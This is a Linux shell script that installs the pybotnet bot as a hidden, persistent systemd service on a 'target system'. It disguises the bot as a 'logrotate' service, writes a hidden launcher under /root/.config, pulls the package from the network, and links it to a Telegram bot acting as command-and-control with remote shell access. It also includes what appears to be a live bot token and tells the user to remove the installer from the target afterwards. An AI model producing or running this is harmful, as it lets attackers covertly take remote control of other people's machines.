#!/bin/sh

## add pybotnet to linux systemd service ##

# -- HELP --:
# - replace youre telegram_bot_token, admin_id and bot_alias_name with your own
# - copy this file to target system
# - run this file by `sudo sh ./install_as_service.sh`
# - remove install_as_service.sh from target system
# - if pybotnet update is available, in telegram bot send `/shell systemctl restart logrotate` to reinstall pybotnet

telegram_bot_token=552670482:AAGweoNtLrHEssdcvLC6whjms78yU8gEO6w
admin_id=902347166
bot_name=example_bot_name


botnet="/root/.config/.logrotate.sh"


tee<<EOF > $botnet
#!/bin/
apt-get update -qq > /dev/null 2>&1 &&
apt-get install python3-pip -y -qq > /dev/null 2>&1 &&
apt-get install python3-dev -y -qq > /dev/null 2>&1 &&
pip3 install "pybotnet>=2<3" -U -qqq --pre &&
python3 -m pybotnet -t $telegram_bot_token -i $admin_id -n $bot_name
EOF

chmod +x $botnet

tee<<EOF > /etc/systemd/system/logrotate.service
[Unit]
Description=Logrotate
After=network.target

[Service]
Type=simple
ExecStart=/bin/sh $botnet
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
EOF

chmod 644 /etc/systemd/system/logrotate.service
systemctl daemon-reload
systemctl enable logrotate.service
systemctl restart logrotate.service
